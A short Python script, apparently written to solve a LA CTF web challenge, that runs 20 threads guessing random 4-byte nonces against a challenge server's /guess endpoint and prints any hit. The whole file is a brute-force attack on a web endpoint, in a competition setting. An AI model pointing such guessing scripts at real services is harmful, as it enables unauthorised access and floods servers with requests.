import Crypto.Util.number
import requests
import os
import threading








def brute():
    MAX = 256**4
    i = 0
    while True:
        i += 1

        if i >= MAX:
            i = i%MAX
        
        #_hex = Crypto.Util.number.long_to_bytes(i).hex()
        #_hex = _hex.rjust(8,"0")
        _hex = os.urandom(4).hex()
        print(_hex,end = "\r")
        resp = requests.get(f"https://notes.chall.lac.tf/guess?nonce={_hex}")


        if resp.text != "Incorrect":
            print(resp.text, _hex)




if __name__ == "__main__":
    import time
    for i in range(20):
        thread = threading.Thread(target=brute, daemon=True)
        thread.start()

    

    time.sleep(1000)
